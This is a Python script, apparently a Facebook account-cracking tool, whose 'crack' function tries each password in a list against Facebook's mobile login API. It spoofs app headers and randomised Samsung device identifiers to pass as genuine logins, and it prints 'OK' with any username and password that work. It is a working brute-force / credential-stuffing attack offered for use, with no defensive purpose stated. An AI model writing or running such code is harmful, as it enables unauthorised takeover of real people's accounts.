# code by Tamsis x Code
import urllib.parse
import requests
import gzip
import json
import re
import time
import uuid
import random
def crack(user,pw):

    for password in pw:
        graphid = str(uuid.uuid4())
        model = random.choice(["SM-G950F", "SM-G955F", "SM-G960F", "SM-G965F", "SM-G970F", "SM-G973F", "SM-G975F", "SM-G980F", "SM-G985F", "SM-G986F", "SM-G988B", "SM-G990F", "SM-G991B", "SM-G998B", "SM-N950F", "SM-N960F", "SM-N970F", "SM-N975F", "SM-N980F", "SM-N985F", "SM-N986B", "SM-N988B", "SM-N990F", "SM-N991B", "SM-N996B", "SM-A125F", "SM-A127F", "SM-A205F", "SM-A207F", "SM-A217F", "SM-A305F", "SM-A307F", "SM-A315F", "SM-A317F", "SM-A325F", "SM-A326B", "SM-A405F", "SM-A407F", "SM-A505F", "SM-A507F", "SM-A515F", "SM-A517F", "SM-A525F", "SM-A526B", "SM-A705F", "SM-A707F", "SM-A715F", "SM-A717F", "SM-A725F", "SM-A727F"])
        headers = {
            "X-Tigon-Is-Retry": "False",
            "X-Fb-Device-Group": "2670",
            "X-Fb-Connection-Type": "WIFI",
            "Content-Encoding": "gzip",
            "User-Agent": "[FBAN/FB4A;FBAV/469.2.0.51.80;FBBV/614136698;FBDM/{density=3.0,width=1080,height=1920};FBLC/id_ID;FBRV/0;FBCR/PSN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+model+";FBSV/9;FBOP/1;FBCA/x86_64:arm64-v8a;]",
            "X-Fb-Sim-Hni": "51000",
            "X-Graphql-Request-Purpose": "fetch",
            "X-Fb-Privacy-Context": "3643298472347298",
            "X-Fb-Friendly-Name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "X-Graphql-Client-Library": "graphservice",
            "X-Fb-Request-Analytics-Tags": '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
            "X-Fb-Net-Hni": "51000",
            "X-Fb-Ta-Logging-Ids": "graphql:"+graphid,
            "X-Fb-Http-Engine": "Liger",
            "X-Fb-Client-Ip": "True",
            "X-Fb-Server-Cluster": "True",
            "Content-Length": "1053"
        }
        params = {
            'credential_type': 'password',
            'try_num': '1',
            'password': '#PWD_FB4A:0:'+str(int(time.time()))+':'+password,
            'family_device_id': str(uuid.uuid4()),
            'device_id': str(uuid.uuid4()),
            'server_login_source': 'login',
            'waterfall_id': str(uuid.uuid4()),
            'machine_id': '',
            'contact_point': user
        }
        var = {'params':
            {'params':json.dumps(params),
                'bloks_versioning_id': 'c1185c61308ac1fbc5289b2d81b3b546e44b122c4330bea1f1fdbfd972674180',
                'app_id': 'com.bloks.www.bloks.caa.login.async.send_login_request'},
                'scale': '3',
                'nt_context': 
                {'using_white_navbar': True,
                'styles_id': '1158b1fab2dc721ce0e585078df9b8e2',
                'pixel_ratio': 3,
                'is_push_on': True,
                'is_flipper_enabled': False,
                'bloks_version': 'c1185c61308ac1fbc5289b2d81b3b546e44b122c4330bea1f1fdbfd972674180'}}
        datastr = {
            'method': 'post',
            'pretty': 'false',
            'format': 'json',
            'server_timestamps': 'true',
            'locale': 'id_ID',
            'purpose': 'fetch',
            'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
            'fb_api_caller_class': 'graphservice',
            'client_doc_id': '119940804210256051883089483260',
            'variables': json.dumps(var),
            'fb_api_analytics_tags': '["GraphServices"]',
            'client_trace_id': graphid}
        datastr = urllib.parse.urlencode(datastr)
        datastr = gzip.compress(datastr.encode('utf-8'))
        headers.update({'Content-Length':str(len(datastr))})
        try:
            response = requests.post(url, headers=headers, data=datastr).json()
            if response['data']['fb_bloks_action'] == None:
                print('spam')
            response = json.loads(response['data']['fb_bloks_action']['root_action']['action']['action_bundle']['bloks_bundle_action'])['layout']['bloks_payload']['action']
            session_key = re.search('session_key(.*?)password', response).group(1)
            print(f'OK : {user}, {password}')
        except Exception as e:print(e)